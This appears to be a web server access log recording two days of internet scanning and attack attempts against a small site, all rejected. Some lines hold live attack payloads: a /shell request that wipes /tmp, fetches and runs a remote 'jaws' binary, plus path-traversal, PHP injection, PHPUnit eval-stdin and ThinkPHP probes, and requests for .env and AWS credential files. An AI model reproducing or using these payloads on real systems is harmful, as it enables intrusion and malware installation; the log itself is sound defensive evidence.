+117.72.194.220 - - [02/Aug/2025 08:41:30] "[31m[1mGET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1[0m" 400 -
+204.76.203.219 - - [02/Aug/2025 08:57:17] "GET / HTTP/1.1" 200 -
+93.174.93.12 - - [02/Aug/2025 08:58:27] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+93.174.93.12 - - [02/Aug/2025 08:58:27] "[31m[1m\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RHÅ\x1a#÷:Nßâ´\x82/ÿ\x09T\x9f§Äy°hÆ\x13\x8c¤\x1c="á\x1a\x98 \x84´,\x85¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À[0m" 400 -
+89.42.231.140 - - [02/Aug/2025 09:01:49] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.1[0m" 404 -
+196.251.84.14 - - [02/Aug/2025 09:13:47] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+106.51.172.119 - - [02/Aug/2025 09:14:51] "GET / HTTP/1.1" 200 -
+106.51.172.119 - - [02/Aug/2025 09:14:51] "GET /static/css/style.css HTTP/1.1" 200 -
+106.51.172.119 - - [02/Aug/2025 09:14:52] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+106.51.172.119 - - [02/Aug/2025 09:15:15] "GET /view/7 HTTP/1.1" 200 -
+106.51.172.119 - - [02/Aug/2025 09:15:15] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+3.132.23.201 - - [02/Aug/2025 09:24:24] code 400, message Bad request version ('À\x14À')
+3.132.23.201 - - [02/Aug/2025 09:24:24] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03ã\x19+:#É±ÒwíüÕ\x8f?ò\x94\x88,À\x1eøù­$\x9c\x9a/"0µ\x0d\x13\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+3.132.23.201 - - [02/Aug/2025 09:24:25] "GET / HTTP/1.1" 200 -
+3.132.23.201 - - [02/Aug/2025 09:24:25] code 400, message Bad request syntax ('SSH-2.0-Go')
+3.132.23.201 - - [02/Aug/2025 09:24:25] "[31m[1mSSH-2.0-Go[0m" 400 -
+3.132.23.201 - - [02/Aug/2025 09:24:27] code 400, message Bad request version ('À\x14À')
+3.132.23.201 - - [02/Aug/2025 09:24:27] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03qF]E"ÙuÈ\x8ay\x08ÕÎ\x09nc£\x92¾ÉíäÖT\x99»ájn«ó#\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+3.132.23.201 - - [02/Aug/2025 09:24:49] "GET / HTTP/1.1" 200 -
+87.255.194.135 - - [02/Aug/2025 09:28:34] "[33mGET /admin/assets/css/jquery-ui.css HTTP/1.0[0m" 404 -
+149.50.96.5 - - [02/Aug/2025 09:45:29] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.1[0m" 404 -
+8.222.233.13 - - [02/Aug/2025 10:04:26] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1')
+8.222.233.13 - - [02/Aug/2025 10:04:26] "[31m[1mGET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1[0m" 400 -
+45.194.66.8 - - [02/Aug/2025 10:17:20] "GET / HTTP/1.1" 200 -
+89.42.231.140 - - [02/Aug/2025 10:24:27] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.1[0m" 404 -
+165.232.75.194 - - [02/Aug/2025 10:37:37] "[33mGET /.env HTTP/1.1[0m" 404 -
+165.232.75.194 - - [02/Aug/2025 10:37:38] "[33mGET /.git/config HTTP/1.1[0m" 404 -
+204.76.203.219 - - [02/Aug/2025 10:51:02] "GET / HTTP/1.1" 200 -
+65.49.1.212 - - [02/Aug/2025 10:53:07] code 400, message Bad request version ('À\x14À')
+65.49.1.212 - - [02/Aug/2025 10:53:07] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03QÚö\x0c\x14±A¨:|$Yfêþ\x16õÏp¿Ñ.\x8aÅ^\x01Û\x81zQèF\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+68.69.186.238 - - [02/Aug/2025 10:56:29] "GET / HTTP/1.1" 200 -
+141.98.11.57 - - [02/Aug/2025 11:07:54] code 400, message Bad request version ('}')
+141.98.11.57 - - [02/Aug/2025 11:07:54] "[31m[1mÿ\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ñ\x03%\x00\x00\x00{ "Ret" : 100, "SessionID" : "0x0" }[0m" 400 -
+91.224.92.17 - - [02/Aug/2025 11:08:30] "GET / HTTP/1.1" 200 -
+170.39.218.2 - - [02/Aug/2025 11:22:44] code 400, message Bad request version ('(*öêÙë\x17')
+170.39.218.2 - - [02/Aug/2025 11:22:44] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03&\x0c\x8aI{\x8am1\x12\x87»×n\x90lÐÏ\x1a5\x0f2\x0c(*öêÙë\x17\x0c[0m" 400 -
+170.39.218.2 - - [02/Aug/2025 11:22:44] "GET / HTTP/1.1" 200 -
+170.39.218.2 - - [02/Aug/2025 11:22:44] "GET / HTTP/1.1" 200 -
+170.39.218.2 - - [02/Aug/2025 11:22:44] "[33mGET /.aws/credentials HTTP/1.1[0m" 404 -
+149.50.96.114 - - [02/Aug/2025 11:23:27] "GET / HTTP/1.1" 200 -
+149.50.96.5 - - [02/Aug/2025 11:29:31] "[33mGET /login.asp HTTP/1.1[0m" 404 -
+89.42.231.140 - - [02/Aug/2025 12:02:12] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.1[0m" 404 -
+149.50.96.5 - - [02/Aug/2025 12:03:50] "GET / HTTP/1.1" 200 -
+196.251.117.75 - - [02/Aug/2025 12:33:21] "[33mGET /.env HTTP/1.1[0m" 404 -
+204.76.203.219 - - [02/Aug/2025 12:46:59] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [02/Aug/2025 13:23:08] "GET / HTTP/1.1" 200 -
+196.251.72.29 - - [02/Aug/2025 13:49:59] "[33mGET /.env HTTP/1.1[0m" 404 -
+87.255.194.135 - - [02/Aug/2025 14:36:29] "[33mGET /admin/assets/js/views/login.js HTTP/1.0[0m" 404 -
+149.50.96.114 - - [02/Aug/2025 14:39:41] "GET / HTTP/1.1" 200 -
+88.214.25.125 - - [02/Aug/2025 14:40:18] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+88.214.25.125 - - [02/Aug/2025 14:40:18] "[31m[1m\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr[0m" 400 -
+204.76.203.219 - - [02/Aug/2025 14:42:45] "GET / HTTP/1.1" 200 -
+69.5.15.194 - - [02/Aug/2025 15:04:22] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+106.51.172.119 - - [02/Aug/2025 15:05:36] "GET /view/7 HTTP/1.1" 200 -
+106.51.172.119 - - [02/Aug/2025 15:05:36] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+193.239.86.191 - - [02/Aug/2025 15:12:35] "[33mPOST /cgi-bin/../../../../../../../../../../bin/sh HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:12:40] "[33mPOST /cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:12:45] "[33mPOST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:12:50] "[33mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:12:56] "[33mGET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:13:01] "[33mGET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:13:05] "[33mGET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:13:10] "[33mGET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:13:14] "[33mGET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:13:20] "[33mGET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:13:25] "[33mGET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:13:30] "[33mGET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:13:36] "[33mGET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:13:41] "[33mGET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:13:45] "[33mGET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:13:52] "[33mGET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:13:57] "[33mGET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:14:02] "[33mGET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:14:06] "[33mGET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:14:11] "[33mGET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:14:17] "[33mGET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:14:22] "[33mGET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:14:28] "[33mGET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:14:32] "[33mGET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:14:37] "[33mGET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:14:42] "[33mGET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:14:47] "[33mGET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:14:52] "[33mGET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:14:57] "[33mGET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:15:00] "[33mGET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:15:07] "[33mGET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:15:12] "[33mGET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:15:19] "[33mGET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:15:23] "[33mGET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:15:29] "[33mGET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:15:33] "[33mGET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:15:38] "[33mGET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:15:43] "[33mGET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:15:48] "[33mGET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:15:53] "[33mGET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:15:59] "[33mGET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:16:05] "[33mGET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:16:11] "[33mGET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:16:15] "[33mGET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1[0m" 404 -
+193.239.86.191 - - [02/Aug/2025 15:16:20] "[33mGET /containers/json HTTP/1.1[0m" 404 -
+149.50.96.5 - - [02/Aug/2025 15:25:26] "[33mPOST /bapply.cgi HTTP/1.1[0m" 404 -
+93.174.93.12 - - [02/Aug/2025 15:27:53] "GET / HTTP/1.0" 200 -
+134.209.86.24 - - [02/Aug/2025 15:28:09] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [02/Aug/2025 15:42:23] "GET / HTTP/1.1" 200 -
+79.124.58.198 - - [02/Aug/2025 16:14:42] "GET / HTTP/1.1" 200 -
+103.20.102.84 - - [02/Aug/2025 16:23:33] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+213.209.143.143 - - [02/Aug/2025 16:24:17] "[33mGET /http.txt HTTP/1.1[0m" 404 -
+213.209.143.143 - - [02/Aug/2025 16:24:17] code 400, message Bad request version ('À\x13À')
+213.209.143.143 - - [02/Aug/2025 16:24:17] "[31m[1m\x16\x03\x01\x00ô\x01\x00\x00ð\x03\x03-Ái\x08EhHÛº\x89ÍÚa\x14uC¸'\x05\x0fÑL¾æ;£WxÉK¹? Qô\x9eßÖf\x968Ý9I¼,\x1fØ\x8di>d\x1eíl\x0f\x05ûQ\x83\x0dMu\x8f$\x00\x1aÀ+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+204.76.203.219 - - [02/Aug/2025 16:31:25] "GET / HTTP/1.1" 200 -
+149.50.96.5 - - [02/Aug/2025 16:32:18] "[33mGET /cgi-bin/index.html HTTP/1.1[0m" 404 -
+141.98.11.57 - - [02/Aug/2025 16:32:20] code 400, message Bad request version ('}')
+141.98.11.57 - - [02/Aug/2025 16:32:20] "[31m[1mÿ\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ñ\x03%\x00\x00\x00{ "Ret" : 100, "SessionID" : "0x0" }[0m" 400 -
+141.98.11.20 - - [02/Aug/2025 16:38:34] "GET / HTTP/1.1" 200 -
+193.46.255.153 - - [02/Aug/2025 16:55:38] "GET / HTTP/1.1" 200 -
+34.79.200.193 - - [02/Aug/2025 17:02:59] "GET / HTTP/1.1" 200 -
+46.19.141.90 - - [02/Aug/2025 17:09:56] "[33mCONNECT google.com:443 HTTP/1.1[0m" 404 -
+149.50.96.5 - - [02/Aug/2025 17:21:47] "GET / HTTP/1.1" 200 -
+93.174.93.12 - - [02/Aug/2025 17:42:23] "GET / HTTP/1.0" 200 -
+149.50.96.114 - - [02/Aug/2025 18:03:26] "GET / HTTP/1.1" 200 -
+79.124.58.198 - - [02/Aug/2025 18:06:21] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 -
+204.76.203.219 - - [02/Aug/2025 18:39:38] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [02/Aug/2025 18:41:09] "GET / HTTP/1.1" 200 -
+47.93.212.99 - - [02/Aug/2025 18:49:28] "[33mPOST /cgi-bin/ViewLog.asp HTTP/1.1[0m" 404 -
+149.50.96.114 - - [02/Aug/2025 18:51:39] "[33mGET /dispatch.asp HTTP/1.1[0m" 404 -
+149.50.96.5 - - [02/Aug/2025 18:54:46] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [02/Aug/2025 19:10:53] "GET / HTTP/1.1" 200 -
+185.170.144.3 - - [02/Aug/2025 19:26:11] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.170.144.3 - - [02/Aug/2025 19:26:11] "[31m[1m\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr[0m" 400 -
+40.76.116.231 - - [02/Aug/2025 19:28:46] "GET / HTTP/1.1" 200 -
+1.24.16.22 - - [02/Aug/2025 19:38:09] "GET / HTTP/1.1" 200 -
+112.94.252.143 - - [02/Aug/2025 19:38:38] "GET / HTTP/1.1" 200 -
+125.82.243.91 - - [02/Aug/2025 19:38:38] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+79.124.58.198 - - [02/Aug/2025 19:41:30] "[33mGET /actuator/gateway/routes HTTP/1.1[0m" 404 -
+185.242.226.99 - - [02/Aug/2025 19:43:59] code 400, message Bad request version ('À\x14À')
+185.242.226.99 - - [02/Aug/2025 19:43:59] "[31m[1m\x16\x03\x01\x00\x8c\x01\x00\x00\x88\x03\x03=,9\x9f¾N\x16\x9f.ÃC²°0\x8a\x0b\x80\x8cXvqcÁ+3X\x98¬èFú<\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+91.224.92.17 - - [02/Aug/2025 19:46:47] "GET / HTTP/1.1" 200 -
+143.255.242.139 - - [02/Aug/2025 19:52:47] "GET / HTTP/1.1" 200 -
+34.226.139.66 - - [02/Aug/2025 20:01:16] "GET / HTTP/1.1" 200 -
+196.251.83.51 - - [02/Aug/2025 20:01:28] "[33mGET /.env HTTP/1.1[0m" 404 -
+193.46.255.153 - - [02/Aug/2025 20:20:32] "GET / HTTP/1.1" 200 -
+204.76.203.219 - - [02/Aug/2025 20:20:39] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [02/Aug/2025 20:33:48] "GET / HTTP/1.1" 200 -
+79.124.58.198 - - [02/Aug/2025 20:47:41] code 400, message Bad request version ('À\x13À')
+79.124.58.198 - - [02/Aug/2025 20:47:41] "[31m[1m\x16\x03\x01\x05¨\x01\x00\x05¤\x03\x039X\x9dhÁì2\x06q\x9f\x09âVFøW\x8d­\x9bqñ»¾k\x0bb"1Ë,\x16¯ ëðÐÃfäK\x9fè2m8\x80\x9ef\x96ÜXd\x1e\x80Îï\x135\x89[\x9f¸în\x06\x00\x1aÀ+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+149.50.96.5 - - [02/Aug/2025 21:22:07] "[33mGET /admin/login.asp HTTP/1.1[0m" 404 -
+91.224.92.17 - - [02/Aug/2025 21:22:36] "GET / HTTP/1.1" 200 -
+199.45.155.99 - - [02/Aug/2025 21:25:54] "GET / HTTP/1.1" 200 -
+199.45.155.99 - - [02/Aug/2025 21:25:56] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+199.45.155.99 - - [02/Aug/2025 21:25:57] code 505, message Invalid HTTP version (2.0)
+199.45.155.99 - - [02/Aug/2025 21:25:57] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+199.45.155.99 - - [02/Aug/2025 21:26:01] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+199.45.155.99 - - [02/Aug/2025 21:26:02] code 505, message Invalid HTTP version (2.0)
+199.45.155.99 - - [02/Aug/2025 21:26:02] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+199.45.155.99 - - [02/Aug/2025 21:26:06] code 400, message Bad request version ('\x10\x9cUqmSL@;G\x89Å7\x8c\x13\x9cd\x1aæúd¾\x17\x8aC')
+199.45.155.99 - - [02/Aug/2025 21:26:06] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03²º\x08S\\À(`7áÛ.\x00³ÒÒår±t72\x01\x1eíc¹F¼J\x10À \x10\x9cUqmSL@;G\x89Å7\x8c\x13\x9cd\x1aæúd¾\x17\x8aC[0m" 400 -
+199.45.155.99 - - [02/Aug/2025 21:26:06] "[33mGET /.well-known/security.txt HTTP/1.1[0m" 404 -
+167.94.138.33 - - [02/Aug/2025 21:38:00] "GET / HTTP/1.1" 200 -
+167.94.138.33 - - [02/Aug/2025 21:38:06] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+167.94.138.33 - - [02/Aug/2025 21:38:11] code 505, message Invalid HTTP version (2.0)
+167.94.138.33 - - [02/Aug/2025 21:38:11] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+167.94.138.33 - - [02/Aug/2025 21:38:29] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+167.94.138.33 - - [02/Aug/2025 21:38:34] code 505, message Invalid HTTP version (2.0)
+167.94.138.33 - - [02/Aug/2025 21:38:34] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+167.94.138.33 - - [02/Aug/2025 21:38:44] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03¡°\x99Éº\x99íQVpÛ.;')
+167.94.138.33 - - [02/Aug/2025 21:38:44] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03¡°\x99Éº\x99íQVpÛ.; b\x05ÉeAÔàÐ\x0fÜ=\x07Ý\x18[0m" 400 -
+167.94.138.33 - - [02/Aug/2025 21:38:46] "[33mGET /security.txt HTTP/1.1[0m" 404 -
+141.98.11.20 - - [02/Aug/2025 21:40:59] "GET / HTTP/1.1" 200 -
+204.76.203.219 - - [02/Aug/2025 22:15:07] "GET / HTTP/1.1" 200 -
+141.98.11.57 - - [02/Aug/2025 22:17:21] code 400, message Bad request version ('}')
+141.98.11.57 - - [02/Aug/2025 22:17:21] "[31m[1mÿ\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ñ\x03%\x00\x00\x00{ "Ret" : 100, "SessionID" : "0x0" }[0m" 400 -
+87.255.194.135 - - [02/Aug/2025 22:27:05] "[33mGET /admin/assets/js/pbxlib.js HTTP/1.0[0m" 404 -
+144.172.110.50 - - [02/Aug/2025 22:27:55] "GET / HTTP/1.0" 200 -
+193.46.255.153 - - [02/Aug/2025 22:38:30] "GET / HTTP/1.1" 200 -
+149.50.96.114 - - [02/Aug/2025 22:50:54] "GET / HTTP/1.1" 200 -
+159.65.146.230 - - [02/Aug/2025 23:43:53] "[33mGET /.env HTTP/1.1[0m" 404 -
+159.65.146.230 - - [02/Aug/2025 23:43:54] "[33mGET /.git/config HTTP/1.1[0m" 404 -
+93.174.93.12 - - [02/Aug/2025 23:49:23] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+93.174.93.12 - - [02/Aug/2025 23:49:23] "[31m[1m\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RHÅ\x1a#÷:Nßâ´\x82/ÿ\x09T\x9f§Äy°hÆ\x13\x8c¤\x1c="á\x1a\x98 \x84´,\x85¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À[0m" 400 -
+52.146.21.44 - - [02/Aug/2025 23:58:59] code 400, message Bad request syntax ('MGLNDD_83.216.144.139_80')
+52.146.21.44 - - [02/Aug/2025 23:58:59] "[31m[1mMGLNDD_83.216.144.139_80[0m" 400 -
+147.185.132.112 - - [02/Aug/2025 23:59:30] "GET / HTTP/1.0" 200 -
+181.199.77.190 - - [03/Aug/2025 00:02:20] "GET / HTTP/1.1" 200 -
+204.76.203.219 - - [03/Aug/2025 00:13:20] "GET / HTTP/1.1" 200 -
+198.55.98.76 - - [03/Aug/2025 00:23:16] "[33mGET /.env HTTP/1.1[0m" 404 -
+149.50.96.5 - - [03/Aug/2025 00:25:02] "[33mGET /dispatch.asp HTTP/1.1[0m" 404 -
+91.224.92.17 - - [03/Aug/2025 00:30:45] "GET / HTTP/1.1" 200 -
+144.172.110.50 - - [03/Aug/2025 00:36:38] "GET / HTTP/1.0" 200 -
+143.198.72.81 - - [03/Aug/2025 00:49:07] "GET / HTTP/1.1" 200 -
+143.198.72.81 - - [03/Aug/2025 00:49:07] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+143.198.72.81 - - [03/Aug/2025 00:49:07] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+193.46.255.153 - - [03/Aug/2025 01:38:08] "GET / HTTP/1.1" 200 -
+141.98.11.20 - - [03/Aug/2025 02:05:03] "GET / HTTP/1.1" 200 -
+103.20.102.84 - - [03/Aug/2025 02:05:11] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+92.63.197.197 - - [03/Aug/2025 02:15:28] "GET / HTTP/1.1" 200 -
+204.76.203.219 - - [03/Aug/2025 02:16:44] "GET / HTTP/1.1" 200 -
+149.100.11.243 - - [03/Aug/2025 02:23:49] "GET / HTTP/1.1" 200 -
+45.128.38.69 - - [03/Aug/2025 02:25:11] "[33mGET /.env HTTP/1.1[0m" 404 -
+45.128.38.69 - - [03/Aug/2025 02:25:11] "[33mGET /wp-content/ HTTP/1.1[0m" 404 -
+149.50.96.114 - - [03/Aug/2025 02:40:01] "GET / HTTP/1.1" 200 -
+64.62.197.227 - - [03/Aug/2025 02:54:42] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03(\x17aE÷EÍÄáäc\x91}Â\x92OÑP¿o\x81$\x93¥üþ\x8eßÃa4\x8e\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+64.62.197.227 - - [03/Aug/2025 02:54:42] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03(\x17aE÷EÍÄáäc\x91}Â\x92OÑP¿o\x81$\x93¥üþ\x8eßÃa4\x8e\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+80.245.230.129 - - [03/Aug/2025 03:10:47] "GET / HTTP/1.1" 200 -
+204.76.203.219 - - [03/Aug/2025 03:22:06] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [03/Aug/2025 04:08:01] "GET / HTTP/1.1" 200 -
+193.46.255.153 - - [03/Aug/2025 04:31:07] "GET / HTTP/1.1" 200 -
+103.20.102.84 - - [03/Aug/2025 05:07:06] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+8.219.60.3 - - [03/Aug/2025 05:14:44] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1')
+8.219.60.3 - - [03/Aug/2025 05:14:44] "[31m[1mGET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1[0m" 400 -
+91.224.92.17 - - [03/Aug/2025 05:18:52] "GET / HTTP/1.1" 200 -
+103.20.102.84 - - [03/Aug/2025 05:22:05] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+149.50.96.114 - - [03/Aug/2025 05:50:32] "GET / HTTP/1.1" 200 -
+147.185.132.58 - - [03/Aug/2025 05:53:03] "[33mGET /.well-known/security.txt HTTP/1.1[0m" 404 -
+204.76.203.219 - - [03/Aug/2025 06:04:16] "GET / HTTP/1.1" 200 -
+149.50.96.5 - - [03/Aug/2025 06:18:31] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [03/Aug/2025 06:32:13] "GET / HTTP/1.1" 200 -
+94.103.183.240 - - [03/Aug/2025 06:32:32] "GET / HTTP/1.1" 200 -
+104.234.115.237 - - [03/Aug/2025 06:46:06] "GET / HTTP/1.0" 200 -
